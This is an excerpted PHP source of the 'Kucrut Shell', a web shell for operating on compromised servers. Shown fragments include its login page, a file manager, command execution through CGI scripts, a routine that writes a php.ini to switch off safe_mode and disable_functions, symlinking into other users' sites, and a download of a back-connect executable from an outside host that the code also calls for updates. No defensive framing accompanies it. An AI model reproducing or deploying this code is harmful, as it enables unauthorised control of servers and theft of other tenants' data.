...
define("__KUCRUT_VERSION__", "1.0");
define("__KUCRUT_UPDATE__", "1");
define("__KUCRUT_CODE_NAME__", "DOGE");
define("__KUCRUT_DATA_FOLDER__", "KUCRUT_DATA");
define("__KUCRUT_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__KUCRUT_SECRET_KEY__", __KUCRUT_POST_ENCRYPTION__?_KucrutSecretKey():'');
$GLOBALS['__KUCRUT_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#0E304A",
...
<title>~ Kucrut Shell-v'.__KUCRUT_VERSION__.'-'.__KUCRUT_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="kucrut x kucrut team 2012" draggable="false" src="https://hantugacor.xyz/x/kucrut-x-kucrut-team.jpg" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Kucrut Shell-v'.__KUCRUT_VERSION__.'-'.__KUCRUT_CODE_NAME__.' ~</b></font></th></tr>
...
function decrypt_post($str){
	if(__KUCRUT_POST_ENCRYPTION__){
		$pwd = __KUCRUT_SECRET_KEY__;
...
function kucrut_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		...
		$target = $GLOBALS["__KUCRUT_COLOR__"][$target];
		if(is_array($target)){
...
function kucrutCssLoadColors(){
	$css = "";
	foreach($GLOBALS['__KUCRUT_COLOR__'] as $key => $value){
		if(!is_array($value)){
...
function _kucrut_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __KUCRUT_DATA_FOLDER__."/kucrutcgiapi/".$lang.$cgi_ext;
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Kucrut Shell - v'.__KUCRUT_VERSION__.'-'.__KUCRUT_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__KUCRUT_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__KUCRUT_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="kucrut x kucrut team 2012" draggable="false" src="https://hantugacor.xyz/x/kucrut-x-kucrut-team.jpg" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['kucrutmini']='http://solevisible.com/images/kucrutmini.png';
...
if($key=='')$key='kucrut';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__KUCRUT_SHELL_CODE'];}
...
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['kucrut7'])&&$_POST['kucrut7']==$key?"selected":(__KUCRUT_POST_ENCRYPTION__&&empty($_POST['kucrut7'])?'selected':'')).'>'.$val.'</option>';
...
if($_POST['kucrut7']=='export'){
	...
	$glob_colors = $GLOBALS["__KUCRUT_COLOR__"];
	$array = array();
...
function kucrutcheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["kucrutcgiapi_mode"])&&!isset($_COOKIE["kucrutcgiapi"])){
			_kucrut_cgicmd("whoami","perl",true);
			if(strlen(kucrutEx("whoami",false,true))>0){
				__kucrut_set_cookie("kucrut_canruncmd", "true");
			}
		}
	}
	if(function_exists("curl_version")){
		$update = new KucrutCURL();
		$json = $update->Send("http://solevisible.com/update.json?ver=".__KUCRUT_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['kucrut_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__KUCRUT_VERSION__ != $json['version'] || __KUCRUT_UPDATE__ != $json['version_number']){
						@setcookie("kucrut_checkupdate", "1", time()+86400);
			...
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				...
				$data["version_number"] = __KUCRUT_VERSION__;
			}
...
function kucrutWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __KUCRUT_DATA_FOLDER__);
	}
...
<div id='rightclick_menu'>
  ...
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"http://solevisible.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(Kucrut)");
...
$s = $kucrut->Send('http://solevisible.com/bc/windows.exe');
$tmpdir = KUCRUT_TEMPDIR;
...
function kucrutCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __KUCRUT_DATA_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__KUCRUT_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#f20b0b;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__KUCRUT_DATA_FOLDER__.'/kucrutsymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__KUCRUT_DATA_FOLDER__.'/cgikucrut/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
kucrutfooter();
...
return('<iframe src="'.__KUCRUT_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class KucrutCURL {
public $headers;
public $user_agent;
